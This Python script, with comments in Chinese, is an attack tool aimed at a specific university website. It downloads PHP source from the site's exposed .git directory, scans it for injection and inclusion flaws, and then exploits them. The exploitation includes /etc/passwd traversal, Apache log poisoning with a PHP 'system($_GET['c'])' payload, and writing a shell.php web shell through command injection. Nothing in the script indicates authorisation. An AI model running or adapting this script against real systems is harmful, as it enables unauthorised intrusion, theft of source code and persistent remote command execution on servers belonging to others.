#!/usr/bin/env python3
import requests
import zlib
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th"

# 递归下载所有PHP文件
def download_tree(tree_hash, path=""):
    tree_path = f"/.git/objects/{tree_hash[:2]}/{tree_hash[2:]}"
    resp = requests.get(url + tree_path, verify=False, timeout=10)
    if resp.status_code != 200:
        return []
    
    try:
        tree_data = zlib.decompress(resp.content)
    except:
        return []
    
    null1 = tree_data.find(b'\0')
    if null1 == -1:
        return []
    
    pos = null1 + 1
    files = []
    
    while pos < len(tree_data):
        null2 = tree_data.find(b'\0', pos)
        if null2 == -1 or null2 + 21 > len(tree_data):
            break
        
        mode_name = tree_data[pos:null2]
        parts = mode_name.split(b' ', 1)
        if len(parts) == 2:
            mode = parts[0].decode()
            filename = parts[1].decode()
            hash_hex = tree_data[null2+1:null2+21].hex()
            full_path = f"{path}/{filename}" if path else filename
            
            if mode == '40000':  # 目录
                sub_files = download_tree(hash_hex, full_path)
                files.extend(sub_files)
            elif filename.endswith('.php'):
                files.append((full_path, hash_hex))
            pos = null2 + 21
        else:
            break
    
    return files

def download_file(file_hash):
    blob_path = f"/.git/objects/{file_hash[:2]}/{file_hash[2:]}"
    resp = requests.get(url + blob_path, verify=False, timeout=10)
    if resp.status_code == 200:
        try:
            blob_data = zlib.decompress(resp.content)
            null_blob = blob_data.find(b'\0')
            if null_blob != -1:
                return blob_data[null_blob+1:].decode('utf-8', errors='ignore')
        except:
            pass
    return None

print("[*] 下载所有PHP文件...")
commit_hash = "28a9d8b08195ac9eae7fa12afca9c5141d0ab151"
tree_hash = "206be85b2f5820dcbb812b49c73c77c48027d4d3"

php_files = download_tree(tree_hash)
print(f"[+] 找到 {len(php_files)} 个PHP文件")

# 分析每个文件
vulnerabilities = []

for file_path, file_hash in php_files:
    print(f"\n[*] 分析: {file_path}")
    content = download_file(file_hash)
    if not content:
        continue
    
    # 1. 文件包含漏洞检测
    include_patterns = [
        r'(include|require|include_once|require_once)\s*\(?\s*[\'"]?([^"\']+)[\'"]?',
        r'(include|require|include_once|require_once)\s*\(\s*\$[^)]+\)',
    ]
    
    for pattern in include_patterns:
        matches = re.finditer(pattern, content, re.IGNORECASE)
        for match in matches:
            if '$' in match.group(0) or '$_GET' in match.group(0) or '$_POST' in match.group(0) or '$_REQUEST' in match.group(0):
                # 检查是否有用户输入
                param_matches = re.findall(r'\$_(GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
                if param_matches:
                    vulnerabilities.append({
                        'file': file_path,
                        'type': '文件包含',
                        'line': content[:match.start()].count('\n') + 1,
                        'code': match.group(0),
                        'params': param_matches
                    })
                    print(f"  [!] 文件包含漏洞!")
                    print(f"      参数: {param_matches}")
    
    # 2. RCE漏洞检测
    dangerous_functions = ['eval', 'system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open']
    for func in dangerous_functions:
        if func in content.lower():
            # 检查是否有用户输入
            pattern = rf'{func}\s*\([^)]*\$'
            if re.search(pattern, content, re.IGNORECASE):
                param_matches = re.findall(r'\$_(GET|POST|REQUEST|COOKIE)\[["\']([^"\']+)["\']\]', content)
                if param_matches:
                    vulnerabilities.append({
                        'file': file_path,
                        'type': f'{func} RCE',
                        'line': content.lower().find(func),
                        'code': func,
                        'params': param_matches
                    })
                    print(f"  [!] {func} RCE漏洞!")
                    print(f"      参数: {param_matches}")
    
    # 3. SQL注入检测
    if 'mysql_query' in content or 'mysqli_query' in content or 'query(' in content:
        # 查找SQL查询中的用户输入
        sql_pattern = r'(mysql_query|mysqli_query|query)\s*\([^)]*\$_(GET|POST|REQUEST)'
        if re.search(sql_pattern, content, re.IGNORECASE):
            param_matches = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
            if param_matches:
                vulnerabilities.append({
                    'file': file_path,
                    'type': 'SQL注入',
                    'code': 'SQL查询',
                    'params': param_matches
                })
                print(f"  [!] SQL注入漏洞!")
                print(f"      参数: {param_matches}")
    
    # 4. 文件上传检测
    if 'move_uploaded_file' in content or '$_FILES' in content:
        print(f"  [*] 包含文件上传功能")
        param_matches = re.findall(r'\$_(GET|POST|REQUEST)\[["\']([^"\']+)["\']\]', content)
        if param_matches:
            vulnerabilities.append({
                'file': file_path,
                'type': '文件上传',
                'code': '文件上传',
                'params': param_matches
            })

# 输出漏洞汇总
print("\n" + "="*70)
print("漏洞汇总:")
print("="*70)
for vuln in vulnerabilities:
    print(f"\n文件: {vuln['file']}")
    print(f"类型: {vuln['type']}")
    print(f"参数: {vuln['params']}")
    if 'code' in vuln:
        print(f"代码: {vuln['code']}")

# 尝试利用文件包含漏洞
print("\n" + "="*70)
print("尝试利用文件包含漏洞:")
print("="*70)

for vuln in vulnerabilities:
    if '文件包含' in vuln['type']:
        file_path = vuln['file'].lstrip('/')
        params = vuln['params']
        
        for param_type, param_name in params[:3]:
            # 尝试包含/etc/passwd
            test_url = f"{url}/{file_path}?{param_name}=../../../../etc/passwd"
            resp = requests.get(test_url, verify=False, timeout=5)
            if "root:" in resp.text:
                print(f"\n[+] 文件包含成功: {test_url}")
                print(f"    响应: {resp.text[:200]}")
                
                # 尝试包含日志文件写入shell
                # 先访问写入PHP代码
                php_code = "<?php system($_GET['c']); ?>"
                log_url = f"{url}/{file_path}?{param_name}=../../../../var/log/apache2/access.log"
                # 发送请求让PHP代码写入日志
                requests.get(f"{url}/{file_path}?{param_name}={php_code}", verify=False, timeout=5)
                # 包含日志文件
                shell_resp = requests.get(f"{log_url}&c=id", verify=False, timeout=5)
                if "uid=" in shell_resp.text:
                    print(f"[+] 通过日志文件获取shell成功!")
                    print(f"    Shell URL: {log_url}&c=id")
                    exit(0)
                
                # 尝试包含PHP session文件
                session_file = f"{url}/{file_path}?{param_name}=../../../../tmp/sess_*"
                # 或者包含临时文件
                tmp_file = f"{url}/{file_path}?{param_name}=../../../../tmp/shell.php"
                # 先写入shell到tmp
                # 通过phpMyAdmin写入
                break

# 尝试利用RCE漏洞
print("\n" + "="*70)
print("尝试利用RCE漏洞:")
print("="*70)

for vuln in vulnerabilities:
    if 'RCE' in vuln['type']:
        file_path = vuln['file'].lstrip('/')
        params = vuln['params']
        
        for param_type, param_name in params[:3]:
            # 尝试执行命令
            test_url = f"{url}/{file_path}?{param_name}=id"
            resp = requests.get(test_url, verify=False, timeout=5)
            if "uid=" in resp.text:
                print(f"\n[+] RCE成功: {test_url}")
                
                # 写入shell
                shell_cmd = f"echo '<?php system($_GET[c]); ?>' > shell.php"
                shell_url = f"{url}/{file_path}?{param_name}={shell_cmd}"
                requests.get(shell_url, verify=False, timeout=5)
                
                # 测试shell
                test_shell = requests.get(f"{url}/shell.php?c=id", verify=False, timeout=5)
                if "uid=" in test_shell.text:
                    print(f"[+] Shell获取成功: {url}/shell.php?c=id")
                    exit(0)

print("\n[-] 审计完成")
